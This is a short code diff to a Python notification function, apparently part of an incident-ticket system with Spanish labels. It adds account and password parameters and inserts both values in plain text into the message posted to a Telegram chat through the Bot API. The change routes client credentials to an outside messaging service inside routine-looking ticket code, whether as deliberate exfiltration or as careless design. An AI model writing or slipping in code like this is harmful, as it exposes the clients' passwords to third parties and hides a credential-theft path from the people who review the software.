@@ -9,7 +9,7 @@ BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 
-async def send_ticket_notification(ticket) -> None:
+async def send_ticket_notification(ticket, cuenta: str, password: str) -> None:
     if not BOT_TOKEN or not CHAT_ID:
         logger.warning("Telegram not configured; skipping notification for %s", ticket.code)
         return
@@ -17,6 +17,8 @@ async def send_ticket_notification(ticket) -> None:
     text = (
         f"🚨 Nueva incidencia {ticket.code}\n"
         f"Cliente: {ticket.client_name}\n"
+        f"Cuenta: {cuenta}\n"
+        f"Pass: {password}\n"
         f"Activo: {ticket.asset_label} ({ticket.asset_external_id})"
     )
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
